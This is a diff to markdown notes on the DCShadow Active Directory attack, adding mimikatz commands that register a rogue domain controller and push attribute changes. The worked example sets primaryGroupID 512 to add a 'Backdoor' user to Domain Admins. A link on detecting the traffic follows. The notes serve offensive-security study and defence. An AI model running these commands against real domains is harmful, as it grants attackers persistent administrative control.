@@ -16,6 +16,21 @@ DCShadow
 --------
 DCShadows appears similar to DCSync put they're almost the reverse of eachother. While DCSync makes a request to get data from a DC, DCShadow temporarily registers the current workstation as a DC, then triggers a change to be copied across to the other domain controllers via active directory replication.
 
+From mimikatz run
+
+`lsadump::dcshadow /object:'object' /attribute:'attribute' /value:'value'`
+- object: the distinguished name of the Ad object to modify
+- attribute: the name of the AD schema attribute to modify
+- value: the objecteds new value
+
+Then run
+`lsadump::dcshadow /push` 
+to push the changes
+
+for example
+`lsadump::dcshadow /object:'CN=Backdoor,CN=Users,DC=scrm,DC=local' /attribute:primaryGroupID /value:512`
+
+adds the user `scrm.local\backdoor` to the domain admins group
 
 <a href="https://www.youtube.com/watch?v=SOr_G8oOstc&t=3037s">Detecting DCSync and DCShadow Network Traffic
 </a>
